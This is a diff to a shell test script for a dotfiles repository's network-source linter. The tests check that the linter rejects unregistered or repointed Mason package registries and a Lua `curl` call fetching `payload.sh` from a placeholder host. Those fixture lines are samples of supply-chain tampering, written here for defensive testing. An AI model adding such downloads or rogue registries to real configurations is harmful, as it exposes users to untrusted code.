@@ -393,6 +393,95 @@ git -C "$fixture_repo" checkout -q -- platforms/macos/Brewfile
 lint_fixture >/dev/null
 printf 'PASS: the tap this repository does use is covered by its own row\n'
 
+# PS-04. A Mason registry is a trust root of the same kind: every LSP server
+# and debug adapter Mason installs is resolved through the configured lists,
+# and one of this repository's two is a personal fork. Both were declared in
+# the registry already, and nothing detected adding, repointing or losing one.
+cat >>"$fixture_repo/common/bootstrap-mason.lua" <<'EOF'
+
+require("mason").setup({
+  registries = {
+    "github:rogueowner/mason-registry",
+  },
+})
+EOF
+if lint_output="$(lint_fixture)"; then
+  printf 'The linter accepted an unregistered Mason registry.\n' >&2
+  exit 1
+fi
+assert_contains "$lint_output" 'common/bootstrap-mason.lua:'
+assert_contains "$lint_output" 'unregistered package-registry network source'
+git -C "$fixture_repo" checkout -q -- common/bootstrap-mason.lua
+lint_fixture >/dev/null
+printf 'PASS: an unregistered Mason registry fails the linter\n'
+
+# A `github:owner/repo` reference names no host either, so the same rule has
+# to read the repository it names. Repointing one of the two declared
+# registries keeps its annotation and must still be refused, which is the case
+# that matters: a repoint is a one-word edit.
+sed -i 's|"github:Crashdummyy/mason-registry"|"github:rogueowner/mason-registry"|' \
+  "$fixture_repo/common/bootstrap-mason.lua"
+if lint_output="$(lint_fixture)"; then
+  printf "The linter let a registry's annotation cover a different one.\n" >&2
+  exit 1
+fi
+assert_contains "$lint_output" 'github:rogueowner/mason-registry'
+assert_contains "$lint_output" 'https://github.com/rogueowner/mason-registry'
+git -C "$fixture_repo" checkout -q -- common/bootstrap-mason.lua
+lint_fixture >/dev/null
+printf 'PASS: a package registry is covered only by the source that is that repository\n'
+
+# And losing the row leaves the declaration behind, which is the direction
+# that made the tracked inventory quietly wrong.
+sed -i '/^mason-registry-crashdummyy\t/d' "$fixture_repo/config/network-sources.tsv"
+if lint_output="$(lint_fixture)"; then
+  printf 'The linter accepted a declaration whose registry row was deleted.\n' >&2
+  exit 1
+fi
+assert_contains "$lint_output" "unknown network-source id 'mason-registry-crashdummyy'"
+git -C "$fixture_repo" checkout -q -- config/network-sources.tsv
+lint_fixture >/dev/null
+printf 'PASS: deleting a registry row fails the declaration that names it\n'
+
+# A download written as an argument vector rather than a command line. The git
+# form was covered and this one was not, so `vim.fn.system({ "curl", ... })`
+# in a Lua file reached the network with nothing to flag it.
+cat >>"$fixture_repo/nvim-lazyvim/.config/nvim/lua/plugins/dotnet.lua" <<'EOF'
+
+vim.fn.system({ "curl", "-fsSL", "https://example.invalid/payload.sh" })
+EOF
+if lint_output="$(lint_fixture)"; then
+  printf 'The linter accepted an argv-form curl download.\n' >&2
+  exit 1
+fi
+assert_contains "$lint_output" 'unregistered curl network source'
+git -C "$fixture_repo" checkout -q -- nvim-lazyvim/.config/nvim/lua/plugins/dotnet.lua
+lint_fixture >/dev/null
+printf 'PASS: an argv-form curl download fails the linter\n'
+
+# The walk that finds an annotation above a continued construct stops at the
+# first line of code, and a list element is not a continuation of the one
+# above it. Otherwise a registry appended under an annotated one would inherit
+# its provenance, which is what the tap work closed for downloads.
+cat >>"$fixture_repo/common/bootstrap-mason.lua" <<'EOF'
+
+require("mason").setup({
+  registries = {
+    -- network-source: mason-registry
+    "github:mason-org/mason-registry",
+    "github:rogueowner/mason-registry",
+  },
+})
+EOF
+if lint_output="$(lint_fixture)"; then
+  printf 'The linter let a registry inherit the annotation of the one above it.\n' >&2
+  exit 1
+fi
+assert_contains "$lint_output" 'unregistered package-registry network source'
+git -C "$fixture_repo" checkout -q -- common/bootstrap-mason.lua
+lint_fixture >/dev/null
+printf 'PASS: a registry listed under an annotated one inherits nothing\n'
+
 # An annotation belongs to the construct it introduces, not to whatever is
 # written under that one. This is the same file appended to twice: the second
 # download inherits nothing from the first one's annotation.
